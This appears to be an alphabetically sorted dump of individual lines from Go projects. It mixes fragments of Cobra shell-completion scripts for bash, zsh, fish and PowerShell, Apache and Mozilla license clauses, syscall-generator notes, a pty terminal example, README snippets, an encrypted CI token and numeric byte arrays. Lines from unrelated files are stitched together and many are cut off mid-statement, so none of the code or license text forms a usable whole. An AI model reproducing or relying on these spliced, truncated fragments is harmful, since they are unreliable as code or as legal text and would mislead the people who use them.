 v.Compare(c) <= 0
 v.Compare(c) == -1
 v.Compare(c) == 1
 v.Compare(c) >= 0
 vPre:
 value[0]
 variable. A regex then picks out
 varname
 visible at http://tip.golang.org/AUTHORS.
 visible at http://tip.golang.org/CONTRIBUTORS.
 visible at https://tip.golang.org/AUTHORS.
 visible at https://tip.golang.org/CONTRIBUTORS.
 w == nil {
 wcslen(bufW[i:])
 wcslen(buf[i:])
 we can implement the Linux-like behavior of omitting errors that
 we cannot use $WordToComplete because it
 we don't have read permissions on
 we need to count the number of valid completions.
 where 
 where any 
 which are portable to the different shells (
 which provides the program's completion choices.
 will
 will actually call out to kubernetes and get any pods.  It will then set 
 will be executed after 
 will be the empty string. 
 will look at the 'nouns' collected. In our example the only noun will be 
 windows.ENABLE_LINE_INPUT 
 windows.ENABLE_LINE_INPUT)
 windows.ENABLE_PROCESSED_INPUT 
 windows.ENABLE_PROCESSED_INPUT)
 windows.ENABLE_PROCESSED_OUTPUT)
 wintrust.h constants for WinVerifyTrustEx 
 with 
 with leading indent
 with which the flag is associated.  In our example this dynamic completion will give results like so:
 within the Source form or
 x.HasPersistentFlags() {
 x.persistentFlag(f.Name) != nil {
 y - 1) / y) 
 you can use Active Help in your program without doing anything about Active Help configuration.
 you can use a combination of 
 you will need to enable it.  You can execute the following once:
 zerror_${GOOS}_${GOARCH}.go
 zos
 zos) 
 zsh completion for %-36[1]s -
 zsh completion needs --flag= prefix
 zsh like
 zsh requires a glob pattern to do file filtering
 zsyscall_${GOOS}_${GOARCH}.go
 zsysnum_${GOOS}_${GOARCH}.go
 ztypes_${GOOS}_${GOARCH}.go
 } __nosys nosys_args int
 } __sysctl sysctl_args int
 } break
 } break obreak_args int
 } exit sys_exit_args void
 } getrlimit __getrlimit_args int
 } setrlimit __setrlimit_args int
 } syscall nosys_args int
 } umask umask_args int
 } vadvise ovadvise_args int
 } wait4 wait_args int
!/bin/bash
!/bin/sh
!/usr/bin/env bash
!/usr/bin/env sh
![Demo](demo.gif)
![Example screenshot](example.png)
![cobra logo](https://cloud.githubusercontent.com/assets/173412/10886352/ad566232-814f-11e5-9cd0-aa101788c117.png)
"                                log.Printf(""error resizing pty: %s"", err)"
"                           ""bin:/sbin:/bin:/opt/bin"","
"                           Version 2.0, January 2004"
"                        $Description = ""  ($($comp.Description))"""
"                        $Description = """""
"                        eval ""COMPREPLY=( "
"                        if err := pty.InheritSize(os.Stdin, ptmx)"
"                    PREFIX="""""
"                    [System.Management.Automation.CompletionResult]::new(""$($comp.Name)$Description"", ""$($comp.Name)$Description"", 'ParameterValue', ""$($comp.Description)"")"
"                    __%[1]s_debug ""Only one completion left"""
"                    cur=""${cur"
"                    if ($($comp.Description) -eq "" "" ) {"
"                    if [ -n ""${ZSH_VERSION:-}"" ]"
"                [[ ""${COMPREPLY[0]}"" == "
"                __%[1]s_debug ""${FUNCNAME[0]}: activating no file completion"""
"                __%[1]s_debug ""${FUNCNAME[0]}: activating no space"""
"                __%[1]s_debug ""Activating file completion"""
"                __%[1]s_debug ""Activating no file completion"""
"                __%[1]s_debug ""Activating no space"""
"                __%[1]s_debug ""ActiveHelp will need delimiter"""
"                __%[1]s_debug ""Adding second completion to perform nospace directive"""
"                __%[1]s_debug ""Completions are now: $__%[1]s_comp_results"""
"                __%[1]s_debug ""No file completion directive not supported in this version of bash"""
"                __%[1]s_debug ""No space directive not supported in this version of bash"""
"                __%[1]s_debug ""deactivating file completion"""
"                __%[1]s_index_of_word ""${flag}"" ""${flags_with_completion[@]}"""
"                allflags=(""${flags["
"                allflags=(""${must_have_one_flag[@]}"")"
"                compadd -x ""${comp}"""
"                filter="""
"                flag=""${cur%%="
"                if [[ $(type -t compopt) = ""builtin"" ]]"
"            """""
"            ""Complete"" {"
"            ""MenuComplete"" {"
"            $CommandAst,"
"            $Description = "" """
"            $WordToComplete,"
"            __%[1]s_debug ""ActiveHelp found: $comp"""
"            __%[1]s_debug ""Adding activeHelp delimiter"""
"            __%[1]s_debug ""Adding completion: ${comp}"""
"            __%[1]s_debug ""Checking if we should do file completion."""
"            __%[1]s_debug ""Final comp: $comp"""
"            __%[1]s_debug ""Join the equal sign flag back to the completion value"""
"            __%[1]s_debug ""Listing directories in $subdir"""
"            __%[1]s_debug ""Listing directories in ."""
"            __%[1]s_debug ""Original comp: $comp"""
"            __%[1]s_debug ""Requesting file completion"""
"            __%[1]s_debug ""_describe did not find completions."""
"            __%[1]s_debug ""_describe found some completions"""
"            __%[1]s_handle_subdirs_in_dir_flag ""$subdir"""
"            comp=""${comp[$startIndex,-1]}"""
"            compadd -x ""--"""
"            done < <(compgen -W ""${allflags["
"            flaghash[${flagname}]=""true"" "
"            if [ -n ""$comp"" ]"
"            if [[ $(type -t compopt) = ""builtin"" ]]"
"            if [[ $comp == ""$cur"""
"            if [[ -z ""${flag_parsing_disabled}"" ]]"
"            if not string match -r -q ""[@=/:.,]"" -- ""$lastChar"""
"            local tab=""$(printf '"
"            next_command=""_${words[c]//:/__}"""
"            next_command=""_%[1]s_root_command"""
"            printf ""%%s"" ""${COMP_LINE[@]}"""
"            printf ""%%s"" ""${PS1@P}${COMP_LINE[@]}"""
"            pushd ""$subdir"" >/dev/null 2>"
"            pushd ""${subdir}"" >/dev/null 2>"
"          attribution notices from the Source form of the Work,"
"          distribution, then any Derivative Works that You distribute must"
"          documentation, if provided along with the Derivative Works"
"          notices within Derivative Works that You distribute, alongside"
"          or as an addendum to the NOTICE text from the Work, provided"
"          pertain to any part of the Derivative Works, in at least one"
"          that You distribute, all copyright, patent, trademark, and"
"          within a display generated by the Derivative Works, if and"
"          within such NOTICE file, excluding those notices that do not"
"        ""$args"" "
"        ""github.com/creack/pty"""
"        ""golang.org/x/term"""
"        ""io"""
"        ""log"""
"        ""os"""
"        ""os/exec"""
"        ""os/signal"""
"        ""syscall"""
"        $Command=$Command.Substring(0,$CursorPosition)"
"        $Flag,$WordToComplete = $WordToComplete.Split(""="",2)"
"        $Space = """""
"        $WordToComplete = $Arguments.Split("" "")[-1]"
"        $_.Name -like ""$WordToComplete"
"        1.1 or earlier of the License, but not also under the terms of a"
"        @{Name=""$Name"""
"        COMPREPLY=( $( compgen -W ""${kubectl_out}["
"        COMPREPLY=( $( compgen -W ""${out["
"        Contributions, either on an unmodified basis, with Modifications, or as"
"        Licensable by such Contributor to use, reproduce, make available,"
"        [[ $comp == ""$cur"""
"        [[ $w = ""$word"" ]] "
"        _, _ = io.Copy(os.Stdout, ptmx)"
"        __%[1]s_debug ""${FUNCNAME[0]}: Adding extra empty parameter"""
"        __%[1]s_debug ""${FUNCNAME[0]}: found a flag ${words[c]}, skip the next argument"""
"        __%[1]s_debug ""${FUNCNAME[0]}: received error from custom completion go code"""
"        __%[1]s_debug ""Activating nospace."""
"        __%[1]s_debug ""Adding extra empty parameter"""
"        __%[1]s_debug ""COMPREPLY[0]: ${COMPREPLY[0]}"""
"        __%[1]s_debug ""Calling _describe"""
"        __%[1]s_debug ""Completing equal sign flag"""
"        __%[1]s_debug ""Completion received error. Ignoring completions."""
"        __%[1]s_debug ""File extension filtering or directory filtering not supported"""
"        __%[1]s_debug ""File filtering command: $filteringCmd"""
"        __%[1]s_debug ""Filtered completions are: $__%[1]s_comp_results"""
"        __%[1]s_debug ""Name: $Name Description: $Description"""
"        __%[1]s_debug ""No completion, probably due to a failure"""
"        __%[1]s_debug ""No directive found.  Setting do default"""
"        __%[1]s_debug ""Received error directive: aborting."""
"        __%[1]s_debug ""Received error from custom completion go code"""
"        __%[1]s_debug ""Removed description from single completion, which is now: ${comp}"""
"        __%[1]s_debug ""ShellCompDirectiveFilterFileExt ShellCompDirectiveFilterDirs are not supported"""
"        __%[1]s_debug ""ShellCompDirectiveNoFileComp is called"""
"        __%[1]s_debug ""ShellCompDirectiveNoSpace is called"""
"        __%[1]s_debug ""numComps: $numComps"""
"        __%[1]s_debug ""prefix: $prefix"""
"        __%[1]s_init_completion -n ""="" "
"        __%[1]s_init_completion -n ""=:"" "
"        __ltrim_colon_completions ""$cur"""
"        _init_completion -n ""=:"" "
"        as described in Section 3.1, and You must inform recipients of the"
"        c := exec.Command(""bash"")"
"        ch := make(chan os.Signal, 1)"
"        comp=""${COMPREPLY[0]%%%%$tab"
"        cur=""${cur"
"        defer func() { _ = term.Restore(int(os.Stdin.Fd()), oldState) }() // Best effort."
"        directive=${lastLine[2,-1]}"
"        done < <(compgen -W ""${noun_aliases["
"        done < <(compgen -W ""${out}"" -- ""$cur"")"
"        done < <(printf ""%%s"
"        echo ""$"
"        echo ""$argv"" >> $file"
"        echo ""$mksyscall -illumos -tags illumos,$GOARCH syscall_illumos.go "
"        elif [ -n ""${words[ $((c"
"        filteringCmd=""_filedir $fullFilter"""
"        flagPrefix=""-P ${BASH_REMATCH}"""
"        flagname=""${flagname}="" "
"        fmt.Println(""Echo: "" "
"        from, or modification of the contents of Covered Software"
"        go func() { _, _ = io.Copy(ptmx, os.Stdin) }()"
"        if [ ""${comp:0:endIndex}"" = ""$activeHelpMarker"" ]"
"        if [ ""${comp[1,$endIndex]}"" = ""$activeHelpMarker"" ]"
"        if [ -n ""$comp"" ]"
"        if [ -n ""$subdir"" ]"
"        if [ -n ""${flagvalue}"" ] "
"        if [[ ""$comp"" == "
"        if [[ -z ""${BASH_VERSION:-}"" "
"        if eval _describe ""completions"" completions $flagPrefix $noSpace"
"        if test (string trim -- $line) = """""
"        local word=${comp%%""${comp"
"        mksyscall=""go run mksyscall_solaris.go"""
"        modifications of Covered Software, or (ii) the combination of its"
"        modify, display, perform, distribute, and otherwise exploit its"
"        next_command=""_${last_command}_${words[c]//:/__}"""
"        noSpace=""-S ''"""
"        oldState, err := term.MakeRaw(int(os.Stdin.Fd()))"
"        or sublicense it under different terms, provided that the license for"
"        out=${out[1,-$suffix]}"
"        out=($(echo ""${kubectl_output}"" "
"        printf """
"        printf ""%%s"
"        printf ""%%s%%s"
"        ptmx, err := pty.Start(c)"
"        reasonable means in a timely manner, at a charge no more than the cost"
"        requestComp=""${requestComp} "
"        requestComp=""${requestComp} ''"""
"        sale, have made, import, and otherwise transfer either its Contributions"
"        set -l completions (string match -r -- """
"        signal.Notify(ch, syscall.SIGWINCH)"
"        subdir=""${completions[1]}"""
"        subdir=$(printf ""%%s"" ""${completions[0]}"")"
"        subdir=$(printf ""%%s"" ""${out}"")"
"      ""Contribution"" shall mean any work of authorship, including"
"      ""Contributor"" shall mean Licensor and any individual or Legal Entity"
"      ""Derivative Works"" shall mean any work, whether in Source or Object"
"      ""Legal Entity"" shall mean the union of the acting entity and all"
"      ""License"" shall mean the terms and conditions for use, reproduction,"
"      ""Licensor"" shall mean the copyright owner or entity authorized by"
"      ""Object"" form shall mean any form resulting from mechanical"
"      ""Source"" form shall mean the preferred form for making modifications,"
"      ""Work"" shall mean the work of authorship, whether in Source or"
"      ""You"" (or ""Your"") shall mean an individual or Legal Entity"
"      ""control"" means (i) the power, direct or indirect, to cause the"
"      (c) You must retain, in the Source form of any Derivative Works"
"      (d) If the Work includes a ""NOTICE"" text file as part of its"
"      (except as stated in this section) patent license to make, have made,"
"      --coolflag string   it's really cool flag (default ""yeaah"")"
"      -a, --author string    author name for copyright attribution (default ""YOUR NAME"")"
"      -h, --help             help for cobra"
"      -l, --license string   name of license for the project"
"      10.3, no one other than the license steward has the right to modify or"
"      Contributor provides its Contributions) on an ""AS IS"" BASIS,"
"      General Public License, Version 2.1, the GNU Affero General Public"
"      If you create software not governed by this License, and you want to"
"      License, Version 3.0, or any later versions of those licenses."
"      License. For legal entities, "
"      License. However, in accepting such obligations, You may act only"
"      Licensor for the purpose of discussing and improving the Work, but"
"      Notwithstanding the above, nothing herein shall supersede or modify"
"      Object form, made available under the License, as indicated by a"
"      Secondary Licenses under the terms of this version of the License, the"
"      WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or"
"      Work (including but not limited to damages for loss of goodwill,"
"      Work or Derivative Works thereof in any medium, with or without"
"      agreed to in writing, Licensor provides the Work (and each"
"      and apparatus claims, in any patent Licensable by such Contributor that"
"      and charge a fee for, acceptance of support, warranty, indemnity,"
"      and issue tracking systems that are managed by, or on behalf of, the"
"      communication on electronic mailing lists, source code control systems,"
"      control with that entity. For the purposes of this definition,"
"      controlled by, or is under common control with You. For purposes of this"
"      copyright license to reproduce, prepare Derivative Works of,"
"      create a new license for such software, you may create and use a modified"
"      defend, and hold each Contributor harmless for any liability"
"      definition, "
"      designated in writing by the copyright owner as ""Not a Contribution."""
"      direction or management of such entity, whether by contract or"
"      distributed with this file, You can"
"      editorial revisions, annotations, elaborations, or other modifications"
"      fmt.Printf(""Inside rootCmd PersistentPostRun with args: %v"
"      fmt.Printf(""Inside rootCmd PersistentPreRun with args: %v"
"      fmt.Printf(""Inside rootCmd PostRun with args: %v"
"      fmt.Printf(""Inside rootCmd PreRun with args: %v"
"      fmt.Printf(""Inside rootCmd Run with args: %v"
"      fmt.Printf(""Inside subCmd PersistentPostRun with args: %v"
"      fmt.Printf(""Inside subCmd PostRun with args: %v"
"      fmt.Printf(""Inside subCmd PreRun with args: %v"
"      fmt.Printf(""Inside subCmd Run with args: %v"
"      fmt.Println(""Echo: "" "
"      fmt.Println(""Print: "" "
"      for any such Derivative Works as a whole, provided Your use,"
"      for use, reproduction, or distribution of Your modifications, or"
"      form, that is based on (or derived from) the Work and for which the"
"      implied, including, without limitation, any warranties or conditions"
"      incidental, or consequential damages of any character arising as a"
"      including but not limited to software source code, documentation"
"      incurred by, or claims asserted against, such Contributor by reason"
"      liable to You for damages, including any direct, indirect, special,"
"      means any form of electronic, verbal, or written communication sent"
"      means any patent claim(s), including without limitation, method, process,"
"      means either the GNU General Public License, Version 2.0, the GNU Lesser"
"      modifications, and in Source or Object form, provided that You"
"      names, trademarks, service marks, or product names of the Licensor,"
"      negligent acts) or agreed to in writing, shall any Contributor be"
"      not limited to compiled object code, generated documentation,"
"      of TITLE, NON-INFRINGEMENT, MERCHANTABILITY, or FITNESS FOR A"
"      of any other Contributor, and only if You agree to indemnify,"
"      of this License, Derivative Works shall not include works that remain"
"      on Your own behalf and on Your sole responsibility, not on behalf"
"      or contributory patent infringement, then any patent licenses"
"      other commercial damages or losses), even if such Contributor"
"      other entities that control, are controlled by, or are under common"
"      otherwise, or (b) ownership of more than fifty percent (50%) of the"
"      otherwise, or (ii) ownership of fifty percent (50%) or more of the"
"      outstanding shares, or (iii) beneficial ownership of such entity."
"      publicly display, publicly perform, sublicense, and distribute the"
"      represent, as a whole, an original work of authorship. For the purposes"
"      reproduction, and distribution of the Work otherwise complies with"
"      return errors.New(""requires a color argument"")"
"      secure: ""T/uvbRV2dguNO8pEq8xINN1U1GUOkoXVf6Yc7gN0DH7OiNfraj88V5jH5M/tIE/WpFw0zNQXA5oF0V1czs7YG5TytG3/ioUdEyWqcpkeMcFJmhk/MAmSIwbfA0jP5EKuQ7fvaRRRclcLD3rHrxYKnDrKUedaQXraz31pJTydK5IaC8vPVfYAZ4NBGenlxVLXAXZM5uwpdqxLV25BAxdlEQkn5AEeGbii59QNblF5xaoYhQ7i5NL7nn4kKYqWwEJ0"
"      separable from, or merely link (or bind by name) to the interfaces of,"
"      source, and configuration files."
"      terms of the Mozilla Public License, v."
"      the License under which You originally received the Covered Software, or"
"      the Mozilla Public License, v. 2.0."
"      the Work or Derivative Works thereof, You may choose to offer,"
"      the copyright owner. For the purposes of this definition, ""submitted"""
"      the direction or management of such entity, whether by contract or"
"      this License, each Contributor hereby grants to You a perpetual,"
"      this License, without any additional terms or conditions."
"      to that Work or Derivative Works thereof, that is intentionally"
"      to the Licensor or its representatives, including but not limited to"
"      transformation or translation of a Source form, including but"
"      use, offer to sell, sell, import, and otherwise transfer the Work,"
"      using, selling, offering for sale, having made, import, or transfer of"
"      whether in tort (including negligence), contract, or otherwise,"
"      work stoppage, computer failure or malfunction, or any and all"
"      worldwide, non-exclusive, no-charge, royalty-free, irrevocable"
"      would be infringed, but for the grant of the License, by the making,"
"     2.1(b) above, no patent license is granted by a Contributor:"
"     All distribution of Covered Software in Source Code Form, including any"
"     Each Contributor hereby grants You a world-wide, royalty-free,"
"     Modifications of such Source Code Form, in each case including portions"
"     Modifications that You create or to which You contribute, must be under the"
"     Moreover, Your grants from a particular Contributor are reinstated on an"
"     Sections 3.1, 3.2, 3.3, and 3.4 are conditions of the licenses granted in"
"     Software is not Incompatible With Secondary Licenses, this License permits"
"     Software, except that You may alter any license notices to the extent"
"     Software. However, You may do so only on Your own behalf, and not on behalf"
"     This License does not grant any rights in the trademarks, service marks, or"
"     You may choose to offer, and to charge a fee for, warranty, support,"
"     You may create and distribute a Larger Work under terms of Your choice,"
"     a. any file in Source Code Form that results from an addition to, deletion"
"     a. such Covered Software must also be made available in Source Code Form,"
"     alone, and You hereby agree to indemnify every Contributor for any"
"     are reinstated (a) provisionally, unless and until such Contributor"
"     b. You may distribute such Executable Form under the terms of this License,"
"     b. under Patent Claims of such Contributor to make, use, sell, offer for"
"     copyright doctrines of fair use, fair dealing, or other equivalents."
"     copyright notices, patent notices, disclaimers of warranty, or limitations"
"     creation of, or owns Covered Software."
"     explicitly and finally terminates Your grants, and (b) on an ongoing basis,"
"     fail to comply with any of its terms. However, if You become compliant,"
"     file or files, that is not Covered Software."
"     indirectly infringes any patent, then the rights granted to You by any and"
"     infringement claim (excluding declaratory judgment actions, counter-claims,"
"     liability incurred by such Contributor as a result of warranty, support,"
"     means a work that combines Covered Software with other material, in a separate"
"     means each individual or legal entity that creates, contributes to the"
"     means having the right to grant, to the maximum extent possible, whether at the"
"     non-compliance with this License from such Contributor, and You become"
"     notice in Exhibit A, the Executable Form of such Source Code Form, and"
"     of the Covered Software is governed by the terms of this License, and how"
"     some reasonable means, this is the first time You have received notice of"
"     such Secondary License(s), so that the recipient of the Larger Work may, at"
"     their option, further distribute the Covered Software under the terms of"
"     time of the initial grant or subsequently, any and all of the rights conveyed by"
"     warranty, support, indemnity, or liability obligation is offered by You"
"     with a work governed by one or more Secondary Licenses, and the Covered"
"    $Command = ""$Command"""
"    $IsEqualFlag = ($WordToComplete -Like ""--"
"    $Program,$Arguments = $Command.Split("" "",2)"
"    $RequestComp=""$Program %[2]s $Arguments"""
"    $Space = "" """
"    Args: cobra.MinimumNArgs(1),"
"    Invoke-Expression -OutVariable out ""$RequestComp"" 2>"
"    Println("""")"
"    Short: ""Echo anything to the screen more times"","
"    Short: ""Echo anything to the screen"","
"    Short: ""My root command"","
"    Short: ""My subcommand"","
"    Short: ""Print anything to the screen"","
"    Use ""cobra [command] --help"" for more information about a command."
"    Use:   ""echo [string to echo]"","
"    Use:   ""print [string to print]"","
"    Use:   ""root [sub]"","
"    Use:   ""sub [no options!]"","
"    Use:   ""times [string to echo]"","
"    __%[1]s_debug """
"    __%[1]s_debug """""
"    __%[1]s_debug ""${FUNCNAME[0]}"""
"    __%[1]s_debug ""${FUNCNAME[0]}: c is $c words[c] is ${words[c]}"""
"    __%[1]s_debug ""${FUNCNAME[0]}: calling ${requestComp}"""
"    __%[1]s_debug ""${FUNCNAME[0]}: cur is ${cur}, words["
"    __%[1]s_debug ""${FUNCNAME[0]}: lastParam ${lastParam}, lastChar ${lastChar}"""
"    __%[1]s_debug ""${FUNCNAME[0]}: looking for ${flagname}"""
"    __%[1]s_debug ""${FUNCNAME[0]}: looking for ${next_command}"""
"    __%[1]s_debug ""${FUNCNAME[0]}: the completion directive is: ${directive}"""
"    __%[1]s_debug ""${FUNCNAME[0]}: the completions are: ${out}"""
"    __%[1]s_debug ""========= starting completion logic =========="""
"    __%[1]s_debug ""About to call: eval ${requestComp}"""
"    __%[1]s_debug ""CURRENT: ${CURRENT}, words["
"    __%[1]s_debug ""Calling $RequestComp"""
"    __%[1]s_debug ""Calling $requestComp"""
"    __%[1]s_debug ""Calling ${requestComp}"""
"    __%[1]s_debug ""Completion results: $results"""
"    __%[1]s_debug ""Completions are: $__%[1]s_comp_results"""
"    __%[1]s_debug ""Comps: $comps"""
"    __%[1]s_debug ""Directive is: $directive"""
"    __%[1]s_debug ""DirectiveLine: $directiveLine"""
"    __%[1]s_debug ""Mode: $Mode"""
"    __%[1]s_debug ""New WordToComplete: $WordToComplete"""
"    __%[1]s_debug ""RequestComp: $RequestComp"""
"    __%[1]s_debug ""Starting __%[1]s_perform_completion"""
"    __%[1]s_debug ""The completion directive is: $Directive"""
"    __%[1]s_debug ""The completion directive is: ${directive}"""
"    __%[1]s_debug ""The completions are: $Out"""
"    __%[1]s_debug ""The completions are: ${out}"""
"    __%[1]s_debug ""Truncated command: $Command"""
"    __%[1]s_debug ""Truncated words["
"    __%[1]s_debug ""WordToComplete: $WordToComplete Command: $Command CursorPosition: $CursorPosition"""
"    __%[1]s_debug ""__%[1]s_handle_completion_types: COMP_TYPE is $COMP_TYPE"""
"    __%[1]s_debug ""args: $args"""
"    __%[1]s_debug ""completion output: ${out}"""
"    __%[1]s_debug ""completions: ${out}"""
"    __%[1]s_debug ""cur is ${cur}, words["
"    __%[1]s_debug ""directive: ${directive}"""
"    __%[1]s_debug ""flagPrefix: $flagPrefix"""
"    __%[1]s_debug ""flagPrefix: ${flagPrefix}"""
"    __%[1]s_debug ""last arg: $lastArg"""
"    __%[1]s_debug ""last line: ${lastLine}"""
"    __%[1]s_debug ""lastParam ${lastParam}, lastChar ${lastChar}"""
"    __%[1]s_debug ""lastParam: ${lastParam}, lastChar: ${lastChar}"""
"    __%[1]s_debug ""nospace: $nospace, nofiles: $nofiles"""
"    __%[1]s_handle_special_char ""$cur"" :"
"    __%[1]s_handle_special_char ""$cur"" ="
"    __%[1]s_index_of_word ""${prev}"" ""${flags_with_completion[@]}"""
"    _filedir ""@(${ext})"""
"    _get_comp_words_by_ref ""$@"" cur prev words cword"
"    args=(""${words[@]:1}"")"
"    complete --do-complete ""%[2]s "" > /dev/null 2>"
"    completions=(""${commands[@]}"")"
"    declare -F ""$next_command"" >/dev/null "
"    done < <(compgen -W ""${completions["
"    done < <(printf ""%%s"
"    echo2 ""  - $os/$arch"""
"    elif [[ -n ""${has_completion_function}"" ]]"
"    elif __%[1]s_contains_word ""${words[c]}"" ""${command_aliases[@]}"""
"    elif __%[1]s_contains_word ""${words[c]}"" ""${commands[@]}"""
"    elif __%[1]s_contains_word ""${words[c]}"" ""${noun_aliases[@]}"""
"    fmt.Fprintln(os.Stderr, err)"
"    fmt.Printf(""%s is less than %s"", v1, v2)"
"    fmt.Println(""Hello, World!"")"
"    fmt.Println(""Hugo Static Site Generator v0.9 -- HEAD"")"
"    for w in ""$@"""
"    if ( $WordToComplete -eq """" -And ( -Not $IsEqualFlag )) {"
"    if ($Directive -eq """") {"
"    if ($WordToComplete -ne """" ) {"
"    if [ ""${directive}"" = ""${out}"" ]"
"    if [ ""${lastChar}"" = """" ]"
"    if [ ""${lastLine[1]}"" = : ]"
"    if [ -z ""${cur}"" ] "
"    if [[ ""$comp"" == "
"    if [[ ""${"
"    if [[ ""${completions["
"    if [[ ""${cur}"" == -"
"    if [[ ""${lastParam}"" ="
"    if [[ ""${words[c]}"" == -"
"    if [[ ${cur} != ""${words[cword]}"" ]]"
"    if [[ -z ""${BASH_VERSION:-}"" "
"    if __%[1]s_contains_word ""${flagname}"" ""${local_nonpersistent_flags[@]}"""
"    if __%[1]s_contains_word ""${flagname}"" ""${must_have_one_flag[@]}"""
"    if __%[1]s_contains_word ""${words[c]}"" ""${must_have_one_noun[@]}"""
"    if kubectl_out=$(kubectl get -o template --template=""${template}"" namespace 2>/dev/null)"
"    if kubectl_output=$(kubectl get --no-headers ""$1"" 2>/dev/null)"
"    if test -n ""$file"""
"    if test -z ""$directive"""
"    if test -z ""$results"""
"    io.WriteString(hash, ""Hello, world."")"
"    local activeHelpMarker=""%[8]s"""
"    local commands=(""%[1]s"")"
"    local comp=""$1"""
"    local dir=""$1"""
"    local ext=""$1"""
"    local file=""$BASH_COMP_DEBUG_FILE"""
"    local flagvalue="""""
"    local has_completion_function="""""
"    local last_command="""""
"    n, err := f.Read(b)"
"    name: ""tml $TRAVIS_TAG"""
"    out=$(eval ""${requestComp}"" 2>/dev/null)"
"    printf ""%%s"
"    pushd ""${dir}"" >/dev/null 2>"
"    requestComp=""${words[0]} %[2]s ${args["
"    requestComp=""${words[1]} %[2]s ${words[2,-1]}"""
"    requestComp=""%[8]s=0 ${words[0]} %[2]s ${args["
"    return fmt.Errorf(""invalid color specified: %s"", args[0])"
"    set -l file ""$BASH_COMP_DEBUG_FILE"""
"    set -l requestComp ""%[9]s=0 $args[1] %[3]s $args[2..-1] $lastArg"""
"    template=""{{ range .items  }}{{ .metadata.name }} {{ end }}"""
"    tml.Printf(""<red>this text is <bold>red</bold></red> and the following is <green>%s</green>"
"    unix.Sendto(hashfd, b[:n], unix.MSG_MORE, addr)"
"    v, _ := version.NewVersion(raw)"
"    words=(""${=words[1,CURRENT]}"")"
"    words=(""${words[@]:0:$cword"
"    },"
"   5. Submission of Contributions. Unless You explicitly state otherwise,"
"   8. Limitation of Liability. In no event and under no legal theory,"
"   Contributor) assume the cost of any necessary servicing, repair, or"
"   Should any Covered Software prove defective in any respect, You (not any"
"   TERMS AND CONDITIONS FOR USE, REPRODUCTION, AND DISTRIBUTION"
"   Under no circumstances and under no legal theory, whether tort (including"
"   and such litigation shall be governed by laws of that jurisdiction, without"
"   character including, without limitation, damages for lost profits, loss of"
"   consequential damages, so this exclusion and limitation may not apply to You."
"   direct, indirect, special, incidental, or consequential damages of any"
"   distributes Covered Software as permitted above, be liable to You for any"
"   extent prohibited by statute or regulation, such description must be"
"   goodwill, work stoppage, computer failure or malfunction, or any and all"
"   hereof. If any provision of this License is held to be unenforceable, such"
"   merchantable, fit for a particular purpose or non-infringing. The entire"
"   negligence), contract, or otherwise, shall any Contributor, or anyone who"
"   order, or regulation then You must: (a) comply with the terms of this License"
"   other commercial damages or losses, even if such party shall have been"
"   reproduction, the version of Cobra and anything else you believe will be"
"   similar one was already opened. If there is one already opened, feel free"
"   useful to help troubleshoot it (e.g. OS environment, environment variables,"
"   warranty of any kind, either expressed, implied, or statutory, including,"
"   with respect to some or all of the Covered Software due to statute, judicial"
"   without limitation, warranties that the Covered Software is free of defects,"
"  ""DEVLINK_RELOAD_LIMITS_VALID_MASK"" "
"  ""fmt"""
"  ""github.com/spf13/cobra"""
"  ""strings"""
"  ""{pathToYourApp}/cmd"""
"  $ %[1]s completion zsh > ""${fpath[1]}/_%[1]s"""
"  $ echo ""autoload -U compinit"
"  - Some version updates may be acceptable for picking up bug fixes, but maintainers must exercise caution when reviewing."
"  -v, --verbose           verbose output"
"  0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,"
"  0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 3, 0, 1, 0,"
"  0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 3, 0, 11, 0,"
"  0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 3, 0, 13, 0,"
"  0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 3, 0, 15, 0,"
"  0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 3, 0, 17, 0,"
"  0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 3, 0, 19, 0,"
"  0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 3, 0, 21, 0,"
"  0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 3, 0, 23, 0,"
"  0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 3, 0, 3, 0,"
"  0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 3, 0, 5, 0,"
"  0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 3, 0, 7, 0,"
"  0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 3, 0, 9, 0,"
"  0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 4, 0, 241, 255,"
"  0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 6, 0, 0, 0,"
"  0, 0, 0, 0, 0, 0, 0, 0, 0, 16, 1, 0, 0, 0, 0, 0,"
"  0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0,"
"  0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0,"
"  0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 4, 0, 241, 255,"
"  0, 0, 0, 0, 0, 0, 0, 0, 100, 0, 0, 0, 4, 0, 0, 0,"
"  0, 0, 0, 0, 0, 0, 0, 0, 102, 1, 0, 0, 32, 0, 0, 0,"
"  0, 0, 0, 0, 0, 0, 0, 0, 109, 0, 0, 0, 18, 0, 0, 0,"
"  0, 0, 0, 0, 0, 0, 0, 0, 112, 17, 0, 0, 32, 17, 0, 0,"
"  0, 0, 0, 0, 0, 0, 0, 0, 115, 0, 0, 0, 1, 0, 0, 0,"
"  0, 0, 0, 0, 0, 0, 0, 0, 116, 0, 0, 0, 18, 0, 0, 0,"
"  0, 0, 0, 0, 0, 0, 0, 0, 118, 0, 0, 0, 1, 0, 17, 0,"
"  0, 0, 0, 0, 0, 0, 0, 0, 119, 0, 0, 0, 4, 0, 0, 0,"
"  0, 0, 0, 0, 0, 0, 0, 0, 12, 0, 0, 0, 2, 0, 12, 0,"
"  0, 0, 0, 0, 0, 0, 0, 0, 123, 0, 0, 0, 18, 0, 0, 0,"
"  0, 0, 0, 0, 0, 0, 0, 0, 126, 0, 0, 0, 1, 0, 0, 0,"
